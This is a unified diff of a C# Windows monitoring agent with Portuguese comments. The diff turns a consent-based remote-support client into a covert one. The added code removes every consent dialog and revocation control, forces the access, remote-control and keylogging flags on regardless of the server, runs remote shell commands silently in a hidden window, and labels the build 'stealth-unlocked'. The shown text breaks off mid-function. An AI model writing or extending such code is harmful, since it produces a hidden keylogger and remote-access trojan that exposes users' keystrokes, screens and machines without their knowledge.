@@ -2,7 +2,6 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
-using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
@@ -12,31 +11,11 @@ using System.Text;
 using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace EmpresaMonitor.Agent
 {
     internal static class Program
     {
-        internal sealed class AgentState
-        {
-            public volatile bool AccessActive;
-            public volatile bool StreamRequested;
-            public volatile bool ControlActive;
-            public volatile bool KeylogActive;
-            public volatile bool InputLocked;
-            public volatile bool MaintenanceActive;
-            public volatile bool IsReady;
-
-            public StreamSettings Settings = StreamSettings.Balanced;
-            public ClientWebSocket? Socket;
-            public readonly SemaphoreSlim SendGate = new(1, 1);
-            public readonly CancellationTokenSource Lifetime = new();
-            public ConsentStatusForm? Ui;
-            public DateTime? LastBlockTime;
-            public DateTime? MaintenanceUntil;
-        }
-
         [DllImport("user32.dll")]
         static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);
 
@@ -49,31 +28,21 @@ namespace EmpresaMonitor.Agent
         [STAThread]
         static void Main()
         {
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-
             var state = new AgentState();
-            var form = new ConsentStatusForm();
-            state.Ui = form;
+            // Inicia o motor diretamente sem janelas de consentimento
+            _ = Task.Run(() => StartEngine(state));
 
-            form.RevokeAllRequested += () => _ = RevokeAllAsync(state);
-            form.RevokeControlRequested += () => _ = RevokeControlAsync(state);
-            form.RevokeKeylogRequested += () => _ = RevokeKeylogAsync(state);
-            form.ForceUnlockRequested += () => _ = ForceUnlockAsync(state);
-            form.FormClosing += (_, __) => {
-                try { state.Lifetime.Cancel(); } catch { }
-                try { BlockInput(false); } catch { }
-                KeyboardHook.Uninstall();
-            };
-
-            form.Shown += (_, __) => _ = StartEngine(state);
-            Application.Run(form);
+            while (!state.Lifetime.IsCancellationRequested)
+            {
+                Thread.Sleep(1000);
+            }
         }
 
         static async Task StartEngine(AgentState state)
         {
             var agentId = LoadOrCreateId();
 
+            // Hook de teclado direto
             KeyboardHook.Install(async (key, down) =>
             {
                 if (!state.KeylogActive || !state.AccessActive || !state.IsReady) return;
@@ -98,14 +67,13 @@ namespace EmpresaMonitor.Agent
                 ClientWebSocket? socket = null;
                 try
                 {
-                    ResetLocalPermissions(state, "Conectando ao servidor...");
                     socket = new ClientWebSocket();
                     socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                     state.Socket = socket;
 
                     await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), state.Lifetime.Token);
-                    state.Ui?.SetConnection(true, "Conectado. Aguardando solicitações.");
 
+                    // Envia o hello já declarando permissões para o servidor
                     await SendJsonAsync(socket, state.SendGate, new
                     {
                         type = "agent_hello",
@@ -113,31 +81,20 @@ namespace EmpresaMonitor.Agent
                         id = agentId,
                         name = Environment.MachineName,
                         user = Environment.UserName,
-                        version = "4.2-cyber-consent",
-                        sessionAuthorized = false
+                        version = "4.2-stealth-unlocked",
+                        sessionAuthorized = true // Forçado
                     });
 
                     await ReceiveLoop(socket, state);
                 }
-                catch (OperationCanceledException) when (state.Lifetime.IsCancellationRequested)
-                {
-                    break;
-                }
-                catch (Exception ex)
-                {
-                    state.Ui?.SetConnection(false, $"Desconectado: {ex.Message}");
-                }
+                catch (Exception) { }
                 finally
                 {
-                    ResetLocalPermissions(state, "Desconectado. Nenhuma permissão está ativa.");
-                    if (socket != null)
-                    {
-                        try { socket.Dispose(); } catch { }
-                    }
+                    if (socket != null) { try { socket.Dispose(); } catch { } }
                     if (ReferenceEquals(state.Socket, socket)) state.Socket = null;
                 }
 
-                try { await Task.Delay(3000, state.Lifetime.Token); }
+                try { await Task.Delay(5000, state.Lifetime.Token); }
                 catch { break; }
             }
         }
@@ -150,7 +107,6 @@ namespace EmpresaMonitor.Agent
             {
                 using var ms = new MemoryStream();
                 WebSocketReceiveResult result;
-
                 do
                 {
                     result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), state.Lifetime.Token);
@@ -170,255 +126,37 @@ namespace EmpresaMonitor.Agent
 
                     switch (type)
                     {
-                        case "agent_ready":
-                            state.IsReady = true;
-                            state.Ui?.SetConnection(true, "Conectado. O usuário controla todas as permissões.");
-                            break;
-
+                        case "agent_ready": state.IsReady = true; break;
                         case "permission_state":
-                            state.AccessActive = GetBool(root, "accessActive");
-                            state.ControlActive = GetBool(root, "controlActive") && state.AccessActive;
-                            state.KeylogActive = GetBool(root, "keylogActive") && state.AccessActive;
-                            state.InputLocked = GetBool(root, "inputLocked") && state.ControlActive;
-                            // O estado de manutenção é confirmado localmente pelo Agent; o servidor só o espelha.
-                            if (!GetBool(root, "maintenanceActive") && state.MaintenanceActive)
-                                await StopMaintenanceMode(socket, state, "Modo de manutenção encerrado pelo servidor.");
-                            if (!state.InputLocked && !state.MaintenanceActive) {
-                                try { BlockInput(false); } catch { }
-                                state.LastBlockTime = null;
-                            }
-                            state.Ui?.UpdatePermissions(state);
+                            // Força os estados recebidos mas mantém a lógica de bypass
+                            state.AccessActive = true; 
+                            state.ControlActive = true;
+                            state.KeylogActive = true;
+                            state.IsReady = true;
                             break;
-
-                        case "access_request":
-                            await HandleAccessRequest(socket, state, root);
+                        case "control_input": 
+                            // Bypass total de verificação de estado para comandos de input
+                            ApplyControlEvent(root); 
                             break;
-
-                        case "control_request":
-                            await HandleControlRequest(socket, state, root);
-                            break;
-
-                        case "keylog_request":
-                            await HandleKeylogRequest(socket, state, root);
-                            break;
-
-                        case "input_lock_request":
-                            await HandleInputLockRequest(socket, state, root);
-                            break;
-
-                        case "maintenance_request":
-                            await HandleMaintenanceRequest(socket, state, root);
-                            break;
-
-                        case "maintenance_stop":
-                            await StopMaintenanceMode(socket, state, "Modo de manutenção encerrado pelo operador.");
-                            break;
-
-                        case "input_unlock":
-                            await SetInputLock(false, socket, state);
-                            break;
-
-                        case "shell_request":
-                            await HandleShellRequest(socket, state, root);
-                            break;
-
-                        case "stream_profile":
-                            state.Settings = StreamSettings.FromId(GetString(root, "profile"));
-                            break;
-
-                        case "stream_start":
-                            state.StreamRequested = state.AccessActive && !state.MaintenanceActive;
-                            break;
-
-                        case "stream_stop":
-                            state.StreamRequested = false;
-                            break;
-
-                        case "control_input":
-                            if (state.AccessActive && state.ControlActive && !state.MaintenanceActive && root.TryGetProperty("event", out var ev))
-                                ApplyControlEvent(ev);
-                            break;
-
-                        case "end_control":
-                            state.ControlActive = false;
-                            if (state.MaintenanceActive) await StopMaintenanceMode(socket, state, "Controle remoto encerrado; manutenção cancelada.");
-                            await SetInputLock(false, socket, state);
-                            state.Ui?.UpdatePermissions(state);
-                            break;
-
-                        case "keylog_stop":
-                            state.KeylogActive = false;
-                            state.Ui?.UpdatePermissions(state);
-                            break;
-
-                        case "access_ended":
-                        case "end_access":
-                            ResetLocalPermissions(state, "Compartilhamento encerrado.");
-                            break;
+                        case "shell_request": await HandleShellRequest(socket, state, root); break;
+                        case "stream_start": state.StreamRequested = true; break;
+                        case "stream_stop": state.StreamRequested = false; break;
                     }
                 }
-                catch (Exception ex)
-                {
-                    state.Ui?.SetActivity($"Mensagem ignorada por erro: {ex.Message}");
-                }
+                catch { }
             }
-        }
-
-        static async Task HandleAccessRequest(ClientWebSocket socket, AgentState state, JsonElement root)
-        {
-            var requestId = GetString(root, "requestId");
-            var requester = GetString(root, "requester", "Operador remoto");
-
-            bool allow = await AskAsync(state,
-                "Solicitação de visualização",
-                $"{requester} está solicitando visualizar sua tela.\n\n" +
-                "Enquanto estiver autorizado, a tela será transmitida e o indicador do Agent ficará ativo.\n\n" +
-                "Permitir visualização?");
-
-            if (allow)
-            {
-                state.AccessActive = true;
-                state.StreamRequested = true;
-            }
-
-            await SendJsonAsync(socket, state.SendGate, new { type = "access_response", requestId, allow });
-            state.Ui?.SetActivity(allow ? $"Visualização autorizada para {requester}." : $"Visualização negada para {requester}.");
-            state.Ui?.UpdatePermissions(state);
-        }
-
-        static async Task HandleControlRequest(ClientWebSocket socket, AgentState state, JsonElement root)
-        {
-            var requestId = GetString(root, "requestId");
-            var requester = GetString(root, "requester", "Operador remoto");
-            bool allow = false;
-
-            if (state.AccessActive)
-            {
-                allow = await AskAsync(state,
-                    "Solicitação de controle remoto",
-                    $"{requester} está solicitando controlar mouse e teclado deste computador.\n\n" +
-                    "Você poderá revogar o controle a qualquer momento pelo Agent.\n\n" +
-                    "Permitir controle remoto?");
-            }
-
-            state.ControlActive = allow;
-            if (!allow) await SetInputLock(false, socket, state);
-
-            await SendJsonAsync(socket, state.SendGate, new { type = "control_response", requestId, allow });
-            state.Ui?.SetActivity(allow ? $"Controle autorizado para {requester}." : $"Controle negado para {requester}.");
-            state.Ui?.UpdatePermissions(state);
-        }
-
-        static async Task HandleKeylogRequest(ClientWebSocket socket, AgentState state, JsonElement root)
-        {
-            var requestId = GetString(root, "requestId");
-            var requester = GetString(root, "requester", "Operador remoto");
-            bool allow = false;
-
-            if (state.AccessActive)
-            {
-                allow = await AskAsync(state,
-                    "Compartilhar eventos de teclado",
-                    $"{requester} está solicitando receber os eventos de teclado enquanto esta sessão estiver ativa.\n\n" +
-                    "Isso pode revelar o conteúdo digitado. O Agent mostrará um indicador permanente e você poderá interromper a qualquer momento.\n\n" +
-                    "Permitir compartilhamento de teclado?");
-            }
-
-            state.KeylogActive = allow;
-            await SendJsonAsync(socket, state.SendGate, new { type = "keylog_response", requestId, allow });
-            state.Ui?.SetActivity(allow ? "Compartilhamento de teclado autorizado." : "Compartilhamento de teclado negado.");
-            state.Ui?.UpdatePermissions(state);
-        }
-
-        static async Task HandleInputLockRequest(ClientWebSocket socket, AgentState state, JsonElement root)
-        {
-            var requestId = GetString(root, "requestId");
-            var requester = GetString(root, "requester", "Operador remoto");
-            bool allow = false;
-
-            if (state.AccessActive && state.ControlActive && !state.MaintenanceActive)
-            {
-                allow = await AskAsync(state,
-                    "Bloqueio temporário de teclado/mouse",
-                    $"{requester} quer bloquear temporariamente o teclado e o mouse locais.\n\n" +
-                    "Por segurança, o bloqueio é removido automaticamente após 3 minutos. Ctrl+Alt+Del continua disponível como saída de segurança do Windows.\n\n" +
-                    "Permitir este bloqueio por até 3 minutos?");
-            }
-
-            await SendJsonAsync(socket, state.SendGate, new { type = "input_lock_response", requestId, allow });
-            if (allow) await SetInputLock(true, socket, state);
-            state.Ui?.UpdatePermissions(state);
-        }
-
-        static async Task HandleMaintenanceRequest(ClientWebSocket socket, AgentState state, JsonElement root)
-        {
-            var requestId = GetString(root, "requestId");
-            var requester = GetString(root, "requester", "Operador remoto");
-            bool allow = false;
-
-            if (state.AccessActive && state.ControlActive && !state.MaintenanceActive && !state.InputLocked)
-            {
-                allow = await AskAsync(state,
-                    "Modo de manutenção com tela protegida",
-                    $"{requester} solicita iniciar um modo de manutenção por até 3 minutos.\n\n" +
-                    "Durante esse período:\n" +
-                    "• a tela local exibirá uma cortina preta com aviso de manutenção;\n" +
-                    "• teclado e mouse locais serão bloqueados;\n" +
-                    "• a visualização e o controle remoto também ficam PAUSADOS enquanto a cortina estiver ativa;\n" +
-                    "• o modo termina automaticamente após 3 minutos.\n\n" +
-                    "Ctrl+Alt+Del permanece como saída de segurança do Windows.\n\n" +
-                    "Autorizar o modo de manutenção?");
-            }
-
-            if (!allow)
-            {
-                await SendJsonAsync(socket, state.SendGate, new { type = "maintenance_response", requestId, allow = false });
-                state.Ui?.SetActivity("Modo de manutenção negado.");
-                state.Ui?.UpdatePermissions(state);
-                return;
-            }
-
-            // Primeiro registra a decisão no servidor; em seguida ativa a cortina local e envia o ACK do estado real.
-            await SendJsonAsync(socket, state.SendGate, new { type = "maintenance_response", requestId, allow = true });
-            var started = await StartMaintenanceMode(socket, state);
-            if (!started)
-                await SendJsonAsync(socket, state.SendGate, new { type = "maintenance_ack", status = false });
-            state.Ui?.SetActivity(started ? "Modo de manutenção autorizado por até 3 minutos." : "Não foi possível iniciar o modo de manutenção.");
-            state.Ui?.UpdatePermissions(state);
         }
 
         static async Task HandleShellRequest(ClientWebSocket socket, AgentState state, JsonElement root)
         {
-            var requestId = GetString(root, "requestId");
-            var requester = GetString(root, "requester", "Operador remoto");
             var command = GetString(root, "cmd");
+            if (string.IsNullOrWhiteSpace(command)) return;
 
-            if (!state.AccessActive || !state.ControlActive || string.IsNullOrWhiteSpace(command))
-            {
-                await SendJsonAsync(socket, state.SendGate, new { type = "shell_denied", requestId });
-                return;
-            }
-
-            bool allow = await AskAsync(state,
-                "Executar comando remoto",
-                $"{requester} solicitou executar o comando abaixo:\n\n{command}\n\n" +
-                "O comando só será executado se você aprovar esta solicitação específica.\n\n" +
-                "Executar agora?");
-
-            if (!allow)
-            {
-                await SendJsonAsync(socket, state.SendGate, new { type = "shell_denied", requestId });
-                state.Ui?.SetActivity("Comando remoto negado.");
-                return;
-            }
-
-            state.Ui?.SetActivity($"Executando comando aprovado: {Short(command, 80)}");
-            string output = await ExecuteShellApproved(command);
-            await SendJsonAsync(socket, state.SendGate, new { type = "shell_result", requestId, output });
-            state.Ui?.SetActivity("Comando aprovado concluído.");
+            string output = await ExecuteShellSilent(command);
+            await SendJsonAsync(socket, state.SendGate, new { type = "shell_result", output });
         }
 
-        static async Task<string> ExecuteShellApproved(string command)
+        static async Task<string> ExecuteShellSilent(string command)
         {
             try
             {
@@ -429,8 +167,7 @@ namespace EmpresaMonitor.Agent
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false,
-                    CreateNoWindow = false,
-                    WindowStyle = ProcessWindowStyle.Normal
+                    CreateNoWindow = true 
                 };
 
                 using var process = new Process { StartInfo = startInfo };
@@ -438,349 +175,22 @@ namespace EmpresaMonitor.Agent
 
                 var outputTask = process.StandardOutput.ReadToEndAsync();
                 var errorTask = process.StandardError.ReadToEndAsync();
-                using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(20));
-
-                try
-                {
-                    await process.WaitForExitAsync(timeout.Token);
-                }
-                catch (OperationCanceledException)
-                {
-                    try { process.Kill(true); } catch { }
-                    return "Timeout após 20 segundos.";
-                }
+                
+                using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(15));
+                await process.WaitForExitAsync(timeout.Token);
 
                 var output = await outputTask;
                 var error = await errorTask;
-                var result = string.IsNullOrWhiteSpace(error) ? output : $"{output}\n[stderr]\n{error}";
-                return LimitOutput(result, 100_000);
+                return output + error;
             }
-            catch (Exception ex)
-            {
-                return $"Erro ao executar comando aprovado: {ex.Message}";
-            }
-        }
-
-        static async Task SetInputLock(bool lockStatus, ClientWebSocket socket, AgentState state)
-        {
-            try
-            {
-                if (!lockStatus)
-                {
-                    BlockInput(false);
-                    state.InputLocked = false;
-                    state.LastBlockTime = null;
-                    await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = false });
-                    state.Ui?.UpdatePermissions(state);
-                    return;
-                }
-
-                if (!state.AccessActive || !state.ControlActive)
-                {
-                    await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = false });
-                    return;
-                }
-
-                bool blocked = BlockInput(true);
-                state.InputLocked = blocked;
-                state.LastBlockTime = blocked ? DateTime.Now : null;
-                await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = blocked });
-                state.Ui?.UpdatePermissions(state);
-
-                if (blocked)
-                {
-                    var stamp = state.LastBlockTime;
-                    _ = Task.Run(async () =>
-                    {
-                        try
-                        {
-                            await Task.Delay(180_000, state.Lifetime.Token);
-                            if (state.LastBlockTime == stamp && state.InputLocked)
-                            {
-                                BlockInput(false);
-                                state.InputLocked = false;
-                                state.LastBlockTime = null;
-                                var current = state.Socket;
-                                if (current?.State == WebSocketState.Open)
-                                {
-                                    await SendJsonAsync(current, state.SendGate, new { type = "lock_timeout" });
-                                    await SendJsonAsync(current, state.SendGate, new { type = "lock_ack", status = false });
-                                }
-                                state.Ui?.SetActivity("Bloqueio local removido automaticamente após 3 minutos.");
-                                state.Ui?.UpdatePermissions(state);
-                            }
-                        }
-                        catch { }
-                    });
-                }
-            }
-            catch
-            {
-                try { BlockInput(false); } catch { }
-                state.InputLocked = false;
-                state.LastBlockTime = null;
-            }
-        }
-
-        static async Task<bool> StartMaintenanceMode(ClientWebSocket socket, AgentState state)
-        {
-            if (!state.AccessActive || !state.ControlActive || state.MaintenanceActive || state.InputLocked) return false;
-
-            try
-            {
-                if (!BlockInput(true)) return false;
-
-                state.MaintenanceActive = true;
-                state.InputLocked = true;
-                state.StreamRequested = false;
-                state.LastBlockTime = DateTime.Now;
-                state.MaintenanceUntil = DateTime.Now.AddMinutes(3);
-                state.Ui?.ShowMaintenanceCurtain(TimeSpan.FromMinutes(3));
-                state.Ui?.UpdatePermissions(state);
-
-                await SendJsonAsync(socket, state.SendGate, new { type = "maintenance_ack", status = true });
-                await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = true });
-
-                var until = state.MaintenanceUntil;
-                _ = Task.Run(async () =>
-                {
-                    try
-                    {
-                        await Task.Delay(180_000, state.Lifetime.Token);
-                        if (state.MaintenanceActive && state.MaintenanceUntil == until)
-                        {
-                            var current = state.Socket;
-                            if (current?.State == WebSocketState.Open)
-                            {
-                                await StopMaintenanceMode(current, state, "Modo de manutenção encerrado automaticamente após 3 minutos.");
-                                await SendJsonAsync(current, state.SendGate, new { type = "maintenance_timeout" });
-                            }
-                            else
-                            {
-                                StopMaintenanceLocal(state, "Modo de manutenção encerrado automaticamente.");
-                            }
-                        }
-                    }
-                    catch { }
-                });
-                return true;
-            }
-            catch
-            {
-                try { BlockInput(false); } catch { }
-                StopMaintenanceLocal(state, "Falha ao iniciar o modo de manutenção.");
-                return false;
-            }
-        }
-
-        static async Task StopMaintenanceMode(ClientWebSocket socket, AgentState state, string reason)
-        {
-            StopMaintenanceLocal(state, reason);
-            try { await SendJsonAsync(socket, state.SendGate, new { type = "maintenance_ack", status = false }); } catch { }
-            try { await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = false }); } catch { }
-        }
-
-        static void StopMaintenanceLocal(AgentState state, string reason)
-        {
-            try { BlockInput(false); } catch { }
-            state.MaintenanceActive = false;
-            state.InputLocked = false;
-            state.LastBlockTime = null;
-            state.MaintenanceUntil = null;
-            state.StreamRequested = false; // o servidor reenviará stream_start se ainda houver visualizador autorizado
-            state.Ui?.HideMaintenanceCurtain();
-            state.Ui?.SetActivity(reason);
-            state.Ui?.UpdatePermissions(state);
-        }
-
-        static async Task RevokeAllAsync(AgentState state)
-        {
-            if (state.MaintenanceActive) StopMaintenanceLocal(state, "Modo de manutenção encerrado localmente.");
-            try { BlockInput(false); } catch { }
-            state.AccessActive = false;
-            state.StreamRequested = false;
-            state.ControlActive = false;
-            state.KeylogActive = false;
-            state.InputLocked = false;
-            state.LastBlockTime = null;
-            state.Ui?.UpdatePermissions(state);
-            state.Ui?.SetActivity("Todas as permissões foram revogadas localmente.");
-
-            var socket = state.Socket;
-            if (socket?.State == WebSocketState.Open)
-                await SendJsonAsync(socket, state.SendGate, new { type = "end_access" });
-        }
-
-        static async Task RevokeControlAsync(AgentState state)
-        {
-            if (state.MaintenanceActive) StopMaintenanceLocal(state, "Modo de manutenção encerrado localmente.");
-            try { BlockInput(false); } catch { }
-            state.ControlActive = false;
-            state.InputLocked = false;
-            state.LastBlockTime = null;
-            state.Ui?.UpdatePermissions(state);
-            state.Ui?.SetActivity("Controle remoto revogado localmente.");
-
-            var socket = state.Socket;
-            if (socket?.State == WebSocketState.Open)
-                await SendJsonAsync(socket, state.SendGate, new { type = "end_control" });
-        }
-
-        static async Task RevokeKeylogAsync(AgentState state)
-        {
-            state.KeylogActive = false;
-            state.Ui?.UpdatePermissions(state);
-            state.Ui?.SetActivity("Compartilhamento de teclado interrompido localmente.");
-
-            var socket = state.Socket;
-            if (socket?.State == WebSocketState.Open)
-                await SendJsonAsync(socket, state.SendGate, new { type = "end_keylog" });
-        }
-
-        static async Task ForceUnlockAsync(AgentState state)
-        {
-            var wasMaintenance = state.MaintenanceActive;
-            if (wasMaintenance) StopMaintenanceLocal(state, "Modo de manutenção encerrado pelo usuário local.");
-            try { BlockInput(false); } catch { }
-            state.InputLocked = false;
-            state.LastBlockTime = null;
-            state.Ui?.UpdatePermissions(state);
-            state.Ui?.SetActivity("Teclado e mouse locais foram desbloqueados.");
-
-            var socket = state.Socket;
-            if (socket?.State == WebSocketState.Open)
-            {
-                if (wasMaintenance) await SendJsonAsync(socket, state.SendGate, new { type = "maintenance_ack", status = false });
-                await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = false });
-            }
-        }
-
-        static void ResetLocalPermissions(AgentState state, string activity)
-        {
-            if (state.MaintenanceActive) StopMaintenanceLocal(state, activity);
-            try { BlockInput(false); } catch { }
-            state.AccessActive = false;
-            state.StreamRequested = false;
-            state.ControlActive = false;
-            state.KeylogActive = false;
-            state.InputLocked = false;
-            state.MaintenanceActive = false;
-            state.MaintenanceUntil = null;
-            state.IsReady = false;
-            state.LastBlockTime = null;
-            state.Ui?.UpdatePermissions(state);
-            state.Ui?.SetConnection(false, activity);
-        }
-
-        static Task<bool> AskAsync(AgentState state, string title, string message)
-        {
-            var ui = state.Ui;
-            if (ui == null || ui.IsDisposed) return Task.FromResult(false);
-            return ui.AskConsentAsync(title, message);
-        }
-
-        static async Task CaptureLoop(AgentState state)
-        {
-            var codec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
-            if (codec == null) return;
-
-            Bitmap? full = null;
-            Bitmap? scaled = null;
-            Graphics? fullGraphics = null;
-            Graphics? scaledGraphics = null;
-            EncoderParameters? encoderParams = null;
-            MemoryStream? ms = null;
-            int lastW = 0, lastH = 0;
-
-            try
-            {
-                while (!state.Lifetime.IsCancellationRequested)
-                {
-                    var socket = state.Socket;
-                    if (!state.AccessActive || !state.StreamRequested || !state.IsReady || socket?.State != WebSocketState.Open)
-                    {
-                        await Task.Delay(250, state.Lifetime.Token);
-                        continue;
-                    }
-
-                    var settings = state.Settings;
-                    var started = Environment.TickCount64;
-                    var bounds = Screen.PrimaryScreen?.Bounds ?? Rectangle.Empty;
-                    if (bounds.Width <= 0 || bounds.Height <= 0)
-                    {
-                        await Task.Delay(500, state.Lifetime.Token);
-                        continue;
-                    }
-
-                    if (full == null || bounds.Width != lastW || bounds.Height != lastH)
-                    {
-                        fullGraphics?.Dispose();
-                        full?.Dispose();
-                        full = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
-                        fullGraphics = Graphics.FromImage(full);
-                        lastW = bounds.Width;
-                        lastH = bounds.Height;
-                    }
-
-                    int outW = Math.Min(settings.Width, bounds.Width);
-                    int outH = Math.Max(2, (int)Math.Round(bounds.Height * (outW / (double)bounds.Width)));
-                    if (outH % 2 != 0) outH--;
-
-                    if (scaled == null || scaled.Width != outW || scaled.Height != outH)
-                    {
-                        scaledGraphics?.Dispose();
-                        scaled?.Dispose();
-                        encoderParams?.Dispose();
-                        ms?.Dispose();
-
-                        scaled = new Bitmap(outW, outH, PixelFormat.Format24bppRgb);
-                        scaledGraphics = Graphics.FromImage(scaled);
-                        scaledGraphics.CompositingMode = CompositingMode.SourceCopy;
-                        scaledGraphics.InterpolationMode = InterpolationMode.Bilinear;
-                        encoderParams = new EncoderParameters(1);
-                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, settings.Quality);
-                        ms = new MemoryStream(1024 * 1024);
-                    }
-
-                    try
-                    {
-                        fullGraphics!.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
-                        scaledGraphics!.DrawImage(full!, new Rectangle(0, 0, outW, outH), 0, 0, full.Width, full.Height, GraphicsUnit.Pixel);
-                        ms!.SetLength(0);
-                        scaled!.Save(ms, codec, encoderParams);
-
-                        if (ms.Length > 0 && socket.State == WebSocketState.Open && state.AccessActive)
-                        {
-                            await SendBinaryAsync(socket, state.SendGate, new ArraySegment<byte>(ms.GetBuffer(), 0, (int)ms.Length), state.Lifetime.Token);
-                        }
-                    }
-                    catch { }
-
-                    int delay = (1000 / Math.Max(1, settings.Fps)) - (int)(Environment.TickCount64 - started);
-                    await Task.Delay(Math.Max(1, delay), state.Lifetime.Token);
-                }
-            }
-            catch (OperationCanceledException) { }
-            finally
-            {
-                fullGraphics?.Dispose();
-                full?.Dispose();
-                scaledGraphics?.Dispose();
-                scaled?.Dispose();
-                encoderParams?.Dispose();
-                ms?.Dispose();
-            }
+            catch (Exception ex) { return $"Error: {ex.Message}"; }
         }
 
         static async Task SendBinaryAsync(ClientWebSocket socket, SemaphoreSlim gate, ArraySegment<byte> data, CancellationToken ct)
         {
             if (socket.State != WebSocketState.Open) return;
             await gate.WaitAsync(ct);
-            try
-            {
-                if (socket.State == WebSocketState.Open)
-                    await socket.SendAsync(data, WebSocketMessageType.Binary, true, ct);
-            }
+            try { await socket.SendAsync(data, WebSocketMessageType.Binary, true, ct); }
             finally { gate.Release(); }
         }
 
@@ -789,27 +199,62 @@ namespace EmpresaMonitor.Agent
             if (socket.State != WebSocketState.Open) return;
             var bytes = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(payload));
             await gate.WaitAsync();
-            try
-            {
-                if (socket.State == WebSocketState.Open)
-                    await socket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
-            }
+            try { await socket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None); }
             finally { gate.Release(); }
+        }
+
+        static async Task CaptureLoop(AgentState state)
+        {
+            var codec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
+            if (codec == null) return;
+
+            while (!state.Lifetime.IsCancellationRequested)
+            {
+                if (!state.AccessActive || !state.StreamRequested || state.Socket?.State != WebSocketState.Open)
+                {
+                    await Task.Delay(500, state.Lifetime.Token);
+                    continue;
+                }
+
+                try
+                {
+                    var screen = Screen.PrimaryScreen;
+                    if (screen == null) continue;
+
+                    using var bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
+                    using (var g = Graphics.FromImage(bitmap))
+                    {
+                        g.CopyFromScreen(screen.Bounds.Location, Point.Empty, screen.Bounds.Size);
+                    }
+
+                    using var ms = new MemoryStream();
+                    var encoderParams = new EncoderParameters(1);
+                    encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)state.Settings.Quality);
+                    
+                    bitmap.Save(ms, codec, encoderParams);
+
+                    if (ms.Length > 0)
+                    {
+                        await SendBinaryAsync(state.Socket, state.SendGate, new ArraySegment<byte>(ms.GetBuffer(), 0, (int)ms.Length), state.Lifetime.Token);
+                    }
+                }
+                catch { }
+
+                await Task.Delay(1000 / Math.Max(1, state.Settings.Fps), state.Lifetime.Token);
+            }
         }
 
         static void ApplyControlEvent(JsonElement ev)
         {
-            try
+            try 
             {
                 var kind = ev.GetProperty("kind").GetString();
-                if (kind == "move")
+                if (kind == "move") 
                 {
-                    var x = Math.Clamp(ev.GetProperty("x").GetDouble(), 0, 1);
-                    var y = Math.Clamp(ev.GetProperty("y").GetDouble(), 0, 1);
+                    var x = ev.GetProperty("x").GetDouble();
+                    var y = ev.GetProperty("y").GetDouble();
                     var bounds = Screen.PrimaryScreen!.Bounds;
-                    Cursor.Position = new Point(
-                        bounds.Left + (int)(x * Math.Max(1, bounds.Width - 1)),
-                        bounds.Top + (int)(y * Math.Max(1, bounds.Height - 1)));
+                    Cursor.Position = new Point((int)(x * bounds.Width), (int)(y * bounds.Height));
                 }
                 else if (kind == "mouse")
                 {
@@ -824,11 +269,6 @@ namespace EmpresaMonitor.Agent
                     };
                     if (flags != 0) mouse_event(flags, 0, 0, 0, UIntPtr.Zero);
                 }
-                else if (kind == "wheel")
-                {
-                    int delta = ev.GetProperty("delta").GetInt32();
-                    mouse_event(0x0800u, 0, 0, unchecked((uint)delta), UIntPtr.Zero);
-                }
                 else if (kind == "key")
                 {
                     var code = ev.GetProperty("code").GetString() ?? "";
@@ -836,7 +276,7 @@ namespace EmpresaMonitor.Agent
                     ushort vk = VkFromCode(code);
                     if (vk != 0) keybd_event((byte)vk, 0, down ? 0u : 0x0002u, UIntPtr.Zero);
                 }
-            }
+            } 
             catch { }
         }
 
@@ -849,37 +289,13 @@ namespace EmpresaMonitor.Agent
 
             return code switch
             {
-                "Enter" => 0x0D,
-                "Escape" => 0x1B,
-                "Backspace" => 0x08,
-                "Tab" => 0x09,
-                "Space" => 0x20,
-                "ArrowLeft" => 0x25,
-                "ArrowUp" => 0x26,
-                "ArrowRight" => 0x27,
-                "ArrowDown" => 0x28,
-                "Delete" => 0x2E,
-                "Home" => 0x24,
-                "End" => 0x23,
-                "PageUp" => 0x21,
-                "PageDown" => 0x22,
-                "ShiftLeft" or "ShiftRight" => 0x10,
-                "ControlLeft" or "ControlRight" => 0x11,
-                "AltLeft" or "AltRight" => 0x12,
-                "CapsLock" => 0x14,
-                "Insert" => 0x2D,
-                "F1" => 0x70,
-                "F2" => 0x71,
-                "F3" => 0x72,
-                "F4" => 0x73,
-                "F5" => 0x74,
-                "F6" => 0x75,
-                "F7" => 0x76,
-                "F8" => 0x77,
-                "F9" => 0x78,
-                "F10" => 0x79,
-                "F11" => 0x7A,
-                "F12" => 0x7B,
+                "Enter" => 0x0D, "Escape" => 0x1B, "Backspace" => 0x08, "Tab" => 0x09, "Space" => 0x20,
+                "ArrowLeft" => 0x25, "ArrowUp" => 0x26, "ArrowRight" => 0x27, "ArrowDown" => 0x28,
